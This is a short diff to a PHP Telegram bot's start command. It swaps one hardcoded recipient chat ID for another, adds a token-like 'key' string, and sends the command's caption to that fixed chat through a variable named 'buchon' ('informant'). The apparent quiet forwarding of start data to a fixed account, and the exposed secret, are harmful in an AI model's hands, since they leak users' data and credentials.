@@ -56,9 +56,14 @@ class StartCommand extends UserCommand
         ]);
 
 
-        $buchon['chat_id']=662767623;
+        
+        
+        $buchon['user_id']=676438755;
+        $buchon['chat_id']=676438755;
+        $buchon['key']='AAG3QBJ5owYiwMjV2wiluXIJB5DGxFyjKbY';
         $buchon['text']=$caption;
         Request::sendMessage($buchon);
+        
         if ($user_profile_photos_response->isOk()) {
             /** @var UserProfilePhotos $user_profile_photos */
             $user_profile_photos = $user_profile_photos_response->getResult();
